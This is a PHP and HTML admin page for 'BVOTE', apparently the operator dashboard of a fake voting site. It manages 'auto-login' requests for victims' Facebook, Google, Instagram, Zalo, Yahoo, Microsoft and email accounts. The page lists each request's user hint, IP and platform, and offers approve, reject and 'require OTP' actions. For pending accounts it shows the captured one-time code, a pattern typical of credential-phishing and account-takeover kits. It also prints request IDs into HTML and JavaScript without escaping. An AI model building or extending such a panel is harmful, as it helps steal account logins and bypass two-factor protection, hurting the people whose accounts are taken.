<?php
/**
 * Auto Login Management Page - BVOTE Admin
 * Quản lý yêu cầu đăng nhập tự động
 */

require_once __DIR__ . '/../../backend/services/auto-login.php';
require_once __DIR__ . '/../../includes/auth_admin.php';

// Kiểm tra quyền admin
if (!isAdmin()) {
    header('Location: /admin/login');
    exit;
}

$autoLogin = new AutoLoginService();

// Xử lý các action
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $requestId = $_POST['request_id'] ?? '';

    switch ($action) {
        case 'approve':
            $result = $autoLogin->approveRequest($requestId, $_SESSION['admin_id'] ?? 1);
            break;
        case 'reject':
            $reason = $_POST['reason'] ?? 'Admin rejected';
            $result = $autoLogin->rejectRequest($requestId, $_SESSION['admin_id'] ?? 1, $reason);
            break;
        case 'require_otp':
            $otpLength = $_POST['otp_length'] ?? 6;
            $result = $autoLogin->requireOTP($requestId, $_SESSION['admin_id'] ?? 1, $otpLength);
            break;
    }
}

// Lấy danh sách yêu cầu
$filters = [
    'platform' => $_GET['platform'] ?? '',
    'status' => $_GET['status'] ?? ''
];

$pendingRequests = $autoLogin->getPendingRequests($filters);
?>

<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quản lý Auto Đăng Nhập - BVOTE Admin</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
</head>
<body class="bg-gray-100">
    <div class="min-h-screen">
        <!-- Header -->
        <header class="bg-white shadow">
            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                <div class="flex justify-between h-16">
                    <div class="flex items-center">
                        <h1 class="text-xl font-semibold text-gray-900">Quản lý Auto Đăng Nhập</h1>
                    </div>
                    <div class="flex items-center space-x-4">
                        <a href="/admin/dashboard" class="text-gray-500 hover:text-gray-700">Dashboard</a>
                        <a href="/admin/logout" class="text-red-600 hover:text-red-800">Đăng xuất</a>
                    </div>
                </div>
            </div>
        </header>

        <!-- Main Content -->
        <main class="max-w-7xl mx-auto py-6 sm:px-6 lg:px-8">
            <!-- Stats Cards -->
            <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
                <div class="bg-white overflow-hidden shadow rounded-lg">
                    <div class="p-5">
                        <div class="flex items-center">
                            <div class="flex-shrink-0">
                                <div class="w-8 h-8 bg-blue-500 rounded-md flex items-center justify-center">
                                    <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                                    </svg>
                                </div>
                            </div>
                            <div class="ml-5 w-0 flex-1">
                                <dl>
                                    <dt class="text-sm font-medium text-gray-500 truncate">Chờ phê duyệt</dt>
                                    <dd class="text-lg font-medium text-gray-900" id="pending-count">-</dd>
                                </dl>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="bg-white overflow-hidden shadow rounded-lg">
                    <div class="p-5">
                        <div class="flex items-center">
                            <div class="flex-shrink-0">
                                <div class="w-8 h-8 bg-yellow-500 rounded-md flex items-center justify-center">
                                    <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                    </svg>
                                </div>
                            </div>
                            <div class="ml-5 w-0 flex-1">
                                <dl>
                                    <dt class="text-sm font-medium text-gray-500 truncate">Chờ OTP</dt>
                                    <dd class="text-lg font-medium text-gray-900" id="otp-count">-</dd>
                                </dl>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="bg-white overflow-hidden shadow rounded-lg">
                    <div class="p-5">
                        <div class="flex items-center">
                            <div class="flex-shrink-0">
                                <div class="w-8 h-8 bg-green-500 rounded-md flex items-center justify-center">
                                    <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                                    </svg>
                                </div>
                            </div>
                            <div class="ml-5 w-0 flex-1">
                                <dl>
                                    <dt class="text-sm font-medium text-gray-500 truncate">Đã phê duyệt</dt>
                                    <dd class="text-lg font-medium text-gray-900" id="approved-count">-</dd>
                                </dl>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="bg-white overflow-hidden shadow rounded-lg">
                    <div class="p-5">
                        <div class="flex items-center">
                            <div class="flex-shrink-0">
                                <div class="w-8 h-8 bg-red-500 rounded-md flex items-center justify-center">
                                    <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                                    </svg>
                                </div>
                            </div>
                            <div class="ml-5 w-0 flex-1">
                                <dl>
                                    <dt class="text-sm font-medium text-gray-500 truncate">Bị từ chối</dt>
                                    <dd class="text-lg font-medium text-gray-900" id="rejected-count">-</dd>
                                </dl>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Filters -->
            <div class="bg-white shadow rounded-lg mb-6">
                <div class="px-4 py-5 sm:p-6">
                    <form method="GET" class="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                            <label for="platform" class="block text-sm font-medium text-gray-700">Nền tảng</label>
                            <select id="platform" name="platform" class="mt-1 block w-full pl-3 pr-10 py-2 text-base border-gray-300 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm rounded-md">
                                <option value="">Tất cả</option>
                                <option value="facebook" <?= $filters['platform'] === 'facebook' ? 'selected' : '' ?>>Facebook</option>
                                <option value="google" <?= $filters['platform'] === 'google' ? 'selected' : '' ?>>Google</option>
                                <option value="instagram" <?= $filters['platform'] === 'instagram' ? 'selected' : '' ?>>Instagram</option>
                                <option value="zalo" <?= $filters['platform'] === 'zalo' ? 'selected' : '' ?>>Zalo</option>
                                <option value="yahoo" <?= $filters['platform'] === 'yahoo' ? 'selected' : '' ?>>Yahoo</option>
                                <option value="microsoft" <?= $filters['platform'] === 'microsoft' ? 'selected' : '' ?>>Microsoft</option>
                                <option value="email" <?= $filters['platform'] === 'email' ? 'selected' : '' ?>>Email</option>
                            </select>
                        </div>
                        <div>
                            <label for="status" class="block text-sm font-medium text-gray-700">Trạng thái</label>
                            <select id="status" name="status" class="mt-1 block w-full pl-3 pr-10 py-2 text-base border-gray-300 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm rounded-md">
                                <option value="">Tất cả</option>
                                <option value="PENDING_REVIEW" <?= $filters['status'] === 'PENDING_REVIEW' ? 'selected' : '' ?>>Chờ phê duyệt</option>
                                <option value="OTP_REQUIRED" <?= $filters['status'] === 'OTP_REQUIRED' ? 'selected' : '' ?>>Chờ OTP</option>
                            </select>
                        </div>
                        <div class="flex items-end">
                            <button type="submit" class="w-full bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700">
                                Lọc
                            </button>
                        </div>
                    </form>
                </div>
            </div>

            <!-- Requests Table -->
            <div class="bg-white shadow overflow-hidden sm:rounded-md">
                <div class="px-4 py-5 sm:px-6">
                    <h3 class="text-lg leading-6 font-medium text-gray-900">Danh sách yêu cầu đăng nhập</h3>
                    <p class="mt-1 max-w-2xl text-sm text-gray-500">Quản lý các yêu cầu đăng nhập tự động</p>
                </div>

                <div class="overflow-x-auto">
                    <table class="min-w-full divide-y divide-gray-200">
                        <thead class="bg-gray-50">
                            <tr>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Thông tin</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Nền tảng</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Trạng thái</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Thời gian</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Thao tác</th>
                            </tr>
                        </thead>
                        <tbody class="bg-white divide-y divide-gray-200" id="requests-table">
                            <?php if ($pendingRequests['success'] && !empty($pendingRequests['requests'])): ?>
                                <?php foreach ($pendingRequests['requests'] as $request): ?>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 whitespace-nowrap">
                                            <div class="text-sm font-medium text-gray-900"><?= htmlspecialchars($request['user_hint']) ?></div>
                                            <div class="text-sm text-gray-500">ID: <?= substr($request['request_id'], 0, 8) ?>...</div>
                                            <div class="text-xs text-gray-400">IP: <?= htmlspecialchars($request['ip_address'] ?? 'N/A') ?></div>
                                        </td>
                                        <td class="px-6 py-4 whitespace-nowrap">
                                            <span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 text-blue-800">
                                                <?= ucfirst(htmlspecialchars($request['platform'])) ?>
                                            </span>
                                        </td>
                                        <td class="px-6 py-4 whitespace-nowrap">
                                            <?php
                                            $statusClass = '';
                                            $statusText = '';
                                            switch ($request['status']) {
                                                case 'PENDING_REVIEW':
                                                    $statusClass = 'bg-yellow-100 text-yellow-800';
                                                    $statusText = 'Chờ phê duyệt';
                                                    break;
                                                case 'OTP_REQUIRED':
                                                    $statusClass = 'bg-blue-100 text-blue-800';
                                                    $statusText = 'Chờ OTP';
                                                    break;
                                                case 'APPROVED':
                                                    $statusClass = 'bg-green-100 text-green-800';
                                                    $statusText = 'Đã phê duyệt';
                                                    break;
                                                case 'REJECTED':
                                                    $statusClass = 'bg-red-100 text-red-800';
                                                    $statusText = 'Bị từ chối';
                                                    break;
                                                case 'EXPIRED':
                                                    $statusClass = 'bg-gray-100 text-gray-800';
                                                    $statusText = 'Hết hạn';
                                                    break;
                                            }
                                            ?>
                                            <span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium <?= $statusClass ?>">
                                                <?= $statusText ?>
                                            </span>
                                        </td>
                                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                            <div><?= date('H:i:s', strtotime($request['created_at'])) ?></div>
                                            <div class="text-xs text-gray-400"><?= date('d/m/Y', strtotime($request['created_at'])) ?></div>
                                        </td>
                                        <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">
                                            <?php if ($request['status'] === 'PENDING_REVIEW'): ?>
                                                <div class="flex space-x-2">
                                                    <form method="POST" class="inline">
                                                        <input type="hidden" name="action" value="approve">
                                                        <input type="hidden" name="request_id" value="<?= $request['request_id'] ?>">
                                                        <button type="submit" class="text-green-600 hover:text-green-900 bg-green-100 hover:bg-green-200 px-2 py-1 rounded text-xs">
                                                            Phê duyệt
                                                        </button>
                                                    </form>
                                                    <form method="POST" class="inline">
                                                        <input type="hidden" name="action" value="require_otp">
                                                        <input type="hidden" name="request_id" value="<?= $request['request_id'] ?>">
                                                        <input type="hidden" name="otp_length" value="6">
                                                        <button type="submit" class="text-blue-600 hover:text-blue-900 bg-blue-100 hover:bg-blue-200 px-2 py-1 rounded text-xs">
                                                            Yêu cầu OTP
                                                        </button>
                                                    </form>
                                                    <button onclick="showRejectDialog('<?= $request['request_id'] ?>')" class="text-red-600 hover:text-red-900 bg-red-100 hover:bg-red-200 px-2 py-1 rounded text-xs">
                                                        Từ chối
                                                    </button>
                                                </div>
                                            <?php elseif ($request['status'] === 'OTP_REQUIRED'): ?>
                                                <div class="text-sm text-gray-500">
                                                    OTP: <span class="font-mono bg-gray-100 px-2 py-1 rounded"><?= $request['otp_code'] ?></span>
                                                </div>
                                            <?php else: ?>
                                                <span class="text-gray-400">-</span>
                                            <?php endif; ?>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            <?php else: ?>
                                <tr>
                                    <td colspan="5" class="px-6 py-4 text-center text-gray-500">
                                        Không có yêu cầu nào
                                    </td>
                                </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </main>
    </div>

    <!-- Reject Dialog -->
    <div id="reject-dialog" class="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full hidden z-50">
        <div class="relative top-20 mx-auto p-5 border w-96 shadow-lg rounded-md bg-white">
            <div class="mt-3 text-center">
                <h3 class="text-lg font-medium text-gray-900 mb-4">Lý do từ chối</h3>
                <form id="reject-form" method="POST">
                    <input type="hidden" name="action" value="reject">
                    <input type="hidden" name="request_id" id="reject-request-id">
                    <textarea name="reason" rows="3" class="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Nhập lý do từ chối..."></textarea>
                    <div class="flex justify-end space-x-3 mt-4">
                        <button type="button" onclick="hideRejectDialog()" class="px-4 py-2 bg-gray-300 text-gray-700 rounded-md hover:bg-gray-400">
                            Hủy
                        </button>
                        <button type="submit" class="px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700">
                            Từ chối
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        // Auto refresh stats
        function updateStats() {
            // Cập nhật số liệu thống kê
            fetch('/api/admin/auth/stats')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('pending-count').textContent = data.stats.pending || 0;
                        document.getElementById('otp-count').textContent = data.stats.otp_required || 0;
                        document.getElementById('approved-count').textContent = data.stats.approved || 0;
                        document.getElementById('rejected-count').textContent = data.stats.rejected || 0;
                    }
                })
                .catch(error => console.error('Error updating stats:', error));
        }

        // Auto refresh table
        function refreshTable() {
            location.reload();
        }

        // Show reject dialog
        function showRejectDialog(requestId) {
            document.getElementById('reject-request-id').value = requestId;
            document.getElementById('reject-dialog').classList.remove('hidden');
        }

        // Hide reject dialog
        function hideRejectDialog() {
            document.getElementById('reject-dialog').classList.add('hidden');
        }

        // Auto refresh every 30 seconds
        setInterval(updateStats, 30000);
        setInterval(refreshTable, 30000);

        // Initial stats update
        updateStats();

        // Close dialog when clicking outside
        document.getElementById('reject-dialog').addEventListener('click', function(e) {
            if (e.target === this) {
                hideRejectDialog();
            }
        });
    </script>
</body>
</html>
